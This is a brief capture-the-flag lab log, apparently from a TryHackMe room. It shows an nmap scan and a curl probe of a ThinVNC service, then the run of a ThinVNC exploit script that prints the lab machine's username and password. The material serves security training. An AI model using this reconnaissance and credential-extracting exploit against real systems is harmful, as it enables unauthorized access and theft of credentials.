
nmap
```
└─$ sudo nmap -Pn -sV 10.10.190.132
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 15:09 PDT
Nmap scan report for 10.10.190.132
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http-proxy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=7/20%Time=62D87D47%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWWW
SF:-Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20nonc
SF:e=\"pDxCj13b5UCo104CXdvlQA==\",\x20opaque=\"HTu8pGymK7U3SPK3QbohCeqdQL7
SF:a4jsyYB\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></HE
SF:AD><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x2
SF:0requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourRequest
SF:,111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\
SF:nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEAD
SF:><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Found                    
SF:</H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x2                    
SF:0was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");                     
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                      
                                                                                              
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.31 seconds

```

curl of 10.10.190.132:8080
```
└─$ curl 10.10.190.132:8080 -v
*   Trying 10.10.190.132:8080...
* Connected to 10.10.190.132 (10.10.190.132) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.190.132:8080
> User-Agent: curl/7.83.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="5on6p13b5UCI2U4CXdvlQA==", opaque="AMdk0dehD1LYp9X4TeeEe8Y1OVkZfaG4Ys"
< 
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.10.190.132 left intact

```


Used the exploit given in the THM page.
```
└─$ python3 *.py 10.10.190.132 8080

     _____ _     _    __     ___   _  ____                                                
    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                               
      | | | '_ \| | '_ \ \ / /|  \| | |                                                   
      | | | | | | | | | \ V / | |\  | |___                                                
      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                               
                            @MuirlandOracle                                               
                
[+] Credentials Found!
Username:       Atlas
Password:       H0ldUpTheHe@vens

```
